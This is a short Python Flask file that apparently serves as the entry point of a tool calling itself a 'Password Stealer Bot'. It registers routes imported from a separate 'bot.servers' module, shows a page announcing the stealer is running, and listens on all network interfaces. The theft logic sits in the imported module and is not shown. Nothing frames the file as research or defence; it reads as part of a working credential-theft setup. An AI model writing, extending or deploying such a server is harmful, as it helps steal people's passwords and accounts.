from flask import Flask, redirect, request
from bot.servers import register_pass_routes

app = Flask(__name__)

register_pass_routes(app)

@app.route('/')
def home():
    return "✅ Password Stealer Bot is running!"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
